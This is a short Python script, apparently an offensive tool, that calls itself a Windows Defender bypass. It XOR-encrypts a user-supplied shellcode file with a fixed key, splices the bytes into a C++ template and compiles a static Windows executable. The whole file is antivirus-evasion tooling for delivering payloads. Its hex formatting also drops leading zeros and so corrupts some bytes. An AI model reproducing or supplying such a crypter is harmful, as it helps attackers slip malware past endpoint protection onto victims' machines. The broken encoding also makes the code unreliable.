import argparse
import sys
import string
import os
import base64

parser = argparse.ArgumentParser(description="windows defender bypass with xor encryption, coded by: @TSuNAmi_ORg")
parser.add_argument('-p', type=str, required=True, help="payload file path, ex: ./payload.bin", dest='payload_file', metavar="<payload.bin>")
parser.add_argument('-o', type=str, required=True, help="output file (.cpp extension), ex: ./output.cpp", dest='output', metavar="<output.cpp>")
parser.add_argument('-e', type=str, required=True, help="exe output file (.exe extension), ex: exe_file.exe", dest='exe_output', metavar="<exe_file.exe>")
args = parser.parse_args()

payload_file = args.payload_file
output = args.output
exe_output = args.exe_output

if(payload_file is not None and output is not None and exe_output is not None):
    def read_source():
        source = open("source.cpp", "rt")
        data = source.read()
        source.close()
        return data

    def read_shellcode():
        payload = open(payload_file, "rb")
        data = payload.read()
        payload.close()
        return data

    def convert_base64():
        payload = open(payload_file, "rb")
        data = payload.read()
        payload.close()
        data = base64.b64encode(data)
        return data

    def xor_encrypt():
        payload = open(payload_file, "rb")
        data = payload.read()
        payload.close()
        key = "secret"
        key_stream = [ord(key[i % len(key)]) for i in range(len(data))]
        encrypted_bytes = bytes([a ^ b for a, b in zip(data, key_stream)])
        return encrypted_bytes

    def main():
        source = read_source()
        payload = xor_encrypt()
        format_payload = '"\\x' + '\\x'.join(hex(x)[2:] for x in payload) + '";'

        new_code = source.replace('unsigned char shellcode[] = "";', 'unsigned char shellcode[] = ' + format_payload)

        pwn = open("generated_source.cpp", "w+")
        pwn.write(new_code)
        pwn.close()

        os.system("x86_64-w64-mingw32-g++ --static generated_source.cpp -o {exe_output}".format(exe_output = exe_output))

        print("payload file: {payload_file}".format(payload_file = payload_file))
        print("raw payload: {format_payload}".format(format_payload = format_payload))
        print("output file: {output}".format(output = output))
        print("exe output file: {exe_output}".format(exe_output = exe_output))

    if __name__ == "__main__":
        main()
else:
    print("help: python <windefbyp.py> -h")
